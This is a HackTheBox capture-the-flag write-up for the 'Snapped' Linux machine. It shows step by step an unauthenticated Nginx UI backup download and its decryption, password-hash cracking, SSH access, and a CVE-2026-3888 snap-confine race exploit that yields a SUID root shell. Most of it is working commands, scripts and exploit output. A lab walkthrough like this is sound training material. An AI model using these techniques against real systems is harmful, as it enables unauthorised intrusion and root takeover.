# HackTheBox — Snapped Writeup

*by [ak4hit](https://github.com/ak4hit)*

![Snapped Banner](images/banner.png)

> **Difficulty:** Hard | **OS:** Linux | **Release:** 2026 | **Rating:** 4.5 ⭐ | **XP:** 850

---

## Attack Path Overview

1. Nmap → port 22 (SSH) + port 80 (nginx) → `snapped.htb`
2. vhost fuzzing → `admin.snapped.htb` → Nginx UI v2.3.2
3. GHSA-g9w5-qffc-6762 → unauthenticated `/api/backup` → AES-encrypted backup with key in response header
4. Decrypt backup → `database.db` → bcrypt hashes for `admin` and `jonathan`
5. John cracks `jonathan`'s hash → `linkinpark` → SSH → **User Flag**
6. CVE-2026-3888 → `snap-confine` + `systemd-tmpfiles` TOCTOU race → SUID bash → **Root Flag**

---

## Step 1 — Reconnaissance

### Nmap

```bash
nmap -A <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx/1.24.0 (Ubuntu)
|_http-title: Snapped — Infrastructure. Orchestration. Control.
```

Only two ports. Add the hostname:

```bash
echo "<TARGET_IP> snapped.htb" >> /etc/hosts
```

### Web Fingerprinting

```bash
whatweb snapped.htb
```

```
http://snapped.htb [200 OK] Email[contact@snapped.htb], nginx/1.24.0
```

Nothing special on the main site — the email `contact@snapped.htb` hints at subdomains worth fuzzing.

### vHost Discovery

```bash
ffuf -u http://snapped.htb -H "Host: FUZZ.snapped.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc 200
```

```
admin    [Status: 200, Size: 1407, Words: 164, Lines: 50]
```

Add it to `/etc/hosts`:

```
<TARGET_IP>   snapped.htb admin.snapped.htb
```

---

## Step 2 — Nginx UI Discovery

Browsing to `http://admin.snapped.htb` reveals an **Nginx UI** login panel.

![Nginx UI Login](images/admin.png)

Directory scan confirms interesting paths:

```bash
ffuf -u http://admin.snapped.htb/FUZZ \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

```
assets       [Status: 301]
mcp          [Status: 403]
robots.txt   [Status: 200]
version.json [Status: 200]
```

Checking the version:

```bash
curl -s http://admin.snapped.htb/version.json
```

```json
{"version":"2.3.2","build_id":1,"total_build":512}
```

**Nginx UI v2.3.2** — vulnerable to [GHSA-g9w5-qffc-6762](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762), an unauthenticated backup download flaw.

---

## Step 3 — Unauthenticated Backup Exfiltration (GHSA-g9w5-qffc-6762)

### The Vulnerability

Nginx UI v2.3.2 exposes `/api/backup` with no authentication. Each response generates a fresh AES-256-CBC key and IV, but critically — they are returned in plaintext in the `X-Backup-Security` response header as `<key_b64>:<iv_b64>`. This allows any unauthenticated attacker to download and decrypt a full backup of the nginx configuration and nginx-ui database.

### Exploitation

Capture both the backup zip and the decryption key in a single request:

```bash
curl -s -D headers.txt http://admin.snapped.htb/api/backup -o backup.zip
grep -i x-backup-security headers.txt
```

```
X-Backup-Security: <KEY_B64>:<IV_B64>
```

> **Important:** The key rotates on every request. You must use the key/IV from the **same** request that produced the zip.

The backup contains three files — all AES-256-CBC encrypted:

```bash
unzip -o backup.zip
# → hash_info.txt  nginx-ui.zip  nginx.zip
```

![Backup downloading from /api/backup](images/api_backup.png)

### Decryption

```bash
pip install pycryptodome --break-system-packages
```

```python
#!/usr/bin/env python3
import base64, zipfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = base64.b64decode("<KEY_B64>")
iv  = base64.b64decode("<IV_B64>")

for fname in ["hash_info.txt", "nginx-ui.zip", "nginx.zip"]:
    with open(fname, "rb") as f:
        enc = f.read()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    dec = unpad(cipher.decrypt(enc), AES.block_size)
    with open(fname + ".dec", "wb") as f:
        f.write(dec)
    print(f"[+] {fname} -> {fname}.dec")
```

```bash
python3 decrypt.py
```

```
[+] hash_info.txt -> hash_info.txt.dec (199 bytes)
[+] nginx-ui.zip -> nginx-ui.zip.dec (7688 bytes)
[+] nginx.zip -> nginx.zip.dec (9936 bytes)
```

---

## Step 4 — Credential Extraction

```bash
cat hash_info.txt.dec
```

```
nginx-ui_hash: 159bfe5cd968b47a7f1b3108d49940c702354028cbf86fc58d4aaeac157da19d
nginx_hash: 0a0f4fe3214e1b3f7a23550eccb3dfc23d5122c7c3c30fed5ecb266bbe81fbe6
timestamp: 20260708-063657
version: 2.3.2
```

Extract the nginx-ui database:

```bash
unzip nginx-ui.zip.dec -d nginx-ui-extracted
sqlite3 nginx-ui-extracted/database.db "SELECT * FROM users;"
```

```
1|...|admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm|...
2|...|jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|...
```

Two bcrypt hashes. The `app.ini` also leaks a JWT secret:

```
JwtSecret = 6c4af436-035a-4942-9ca6-172b36696ce9
```

### Cracking with John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
linkinpark       (jonathan)
```

`jonathan`'s password cracks in under 30 minutes: **`linkinpark`**. The `admin` hash does not crack from rockyou.

---

## Step 5 — SSH as jonathan → User Flag

```bash
ssh jonathan@snapped.htb
# Password: linkinpark
```

```
jonathan@snapped:~$ cat user.txt
08cc****************************
```

🚩 **User Flag captured.**

---

## Step 6 — Privilege Escalation — CVE-2026-3888

### Identifying the Attack Surface

Standard privesc checks:

```bash
sudo -l          # → not in sudoers
find / -perm -4000 -type f 2>/dev/null
```

Key SUID binary found:

```
-rwsr-xr-x 1 root root 159016  /usr/lib/snapd/snap-confine
```

Snap version:

```bash
snap version
```

```
snap    2.63.1+24.04
snapd   2.63.1+24.04
ubuntu  24.04
kernel  6.17.0-19-generic
```

Check cleanup timer:

```bash
systemctl show systemd-tmpfiles-clean.timer | grep OnUnitActiveSec
```

```
TimersMonotonic={ OnUnitActiveUSec=1min ...}
```

The timer runs every **1 minute** — a custom override at `/etc/systemd/system/systemd-tmpfiles-clean.timer.d/override.conf` has been set, deliberately shortening the default 30-day window for this box.

### What is CVE-2026-3888?

CVE-2026-3888 is a Local Privilege Escalation affecting Ubuntu Desktop 24.04+ with unpatched snapd (< 2.74.2), discovered by Qualys in March 2026. It exploits the interaction between two individually secure programs:

| Component | Role |
|---|---|
| `snap-confine` | SUID-root binary that builds mount namespaces for snap apps |
| `systemd-tmpfiles` | Root daemon that periodically cleans stale files in `/tmp` |

The attack flow:

1. Enter a Firefox snap sandbox — `snap-confine` creates `/tmp/.snap` owned by root
2. Let `/tmp/.snap` go stale — `systemd-tmpfiles` deletes it (1 minute on this box)
3. Attacker recreates `/tmp/.snap` — now owned by the attacker
4. Use AF_UNIX socket backpressure to single-step `snap-confine` execution
5. Atomically swap the library directory at the right moment
6. `snap-confine` bind-mounts attacker-owned libraries as root into the namespace
7. Overwrite `ld-linux-x86-64.so.2` with shellcode that calls `setreuid(0,0)` + `execve`
8. SUID bash dropped to `/var/snap/firefox/common/bash`

### Exploitation

Compile on the attacker machine:

```bash
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
```

Transfer to target — use `/dev/shm` to avoid tmpfiles cleanup:

```bash
sshpass -p linkinpark scp exploit librootshell.so jonathan@snapped.htb:/dev/shm/
```

Execute from `/dev/shm`:

```bash
cd /dev/shm
chmod +x exploit
./exploit librootshell.so
```

```
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /dev/shm/librootshell.so (9056 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 3239

[Phase 2] Waiting for .snap deletion...
[+] .snap deleted.

[Phase 3] Destroying cached mount namespace...
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   285 entries copied to exchange directory
[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[+]   Poisoned namespace PID: 3607

[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[+]   Payload injected.

[Phase 6] Triggering root via SUID snap-confine...
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)

================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================
```

> **Note:** Run from `/dev/shm`, not `/tmp`. The tmpfiles daemon aggressively cleans `/tmp` every minute on this box — files placed there (including the exploit binary itself) get deleted mid-run. `/dev/shm` is world-writable tmpfs that bypasses the tmpfiles cleanup rules — a reliable staging ground when `/tmp` is hostile.

### Root Flag

```bash
/var/snap/firefox/common/bash -p
```

```
bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root)

bash-5.1# cat /root/root.txt
8acb****************************
```

👑 **Root Flag captured.**

---

## Full Attack Chain

```
Nmap → nginx:80 (snapped.htb) + SSH:22
              ↓
     ffuf vhost fuzzing → admin.snapped.htb
              ↓
     Nginx UI v2.3.2 login panel
     version.json → version leak
              ↓
     GHSA-g9w5-qffc-6762
     GET /api/backup (unauthenticated)
     X-Backup-Security header → AES key+IV in plaintext
              ↓
     Decrypt backup → nginx-ui.zip → database.db
     sqlite3 → bcrypt hashes (admin, jonathan)
              ↓
     john + rockyou → jonathan:linkinpark
              ↓
     SSH as jonathan
              ↓
          USER FLAG 🚩
              ↓
     snap version 2.63.1+24.04 (< 2.74.2)
     snap-confine SUID-root
     systemd-tmpfiles timer = 1 minute (modified for box)
              ↓
     CVE-2026-3888 — TOCTOU race
     /tmp/.snap deleted → attacker recreates → race won
     ld-linux-x86-64.so.2 poisoned with shellcode
              ↓
     SUID bash → /var/snap/firefox/common/bash -p
              ↓
          ROOT FLAG 👑
```

---

## Key Takeaways

- **Per-request crypto keys mean nothing if you leak them in headers.** The backup endpoint generates a fresh AES key for every response — but handing it back in `X-Backup-Security` makes the encryption completely pointless. Sensitive files should never be accessible without authentication in the first place.
- **Authentication is not optional on admin panels.** `admin.snapped.htb` had zero auth on `/api/backup`. A subdomain being "obscure" is not a security control — vhost fuzzing takes seconds.
- **Bcrypt is strong, but passwords aren't.** `linkinpark` is a top-tier rockyou entry. Even a good hashing algorithm can't save a weak password.
- **`/dev/shm` vs `/tmp` matters.** Aggressive `systemd-tmpfiles` cleanup deleted exploit binaries from `/tmp` mid-run. `/dev/shm` is world-writable tmpfs that bypasses the tmpfiles cleanup rules — a useful staging ground when `/tmp` is hostile.
- **CVE-2026-3888 is a composition vulnerability.** Neither `snap-confine` nor `systemd-tmpfiles` is individually broken. The flaw emerges from their interaction — `snap-confine` trusting a directory that `systemd-tmpfiles` just cleaned and an attacker recreated. Defense requires patching the handshake between programs, not just hardening each in isolation.

---

*HackTheBox · Snapped · Hard · Linux · by [ak4hit](https://github.com/ak4hit)*
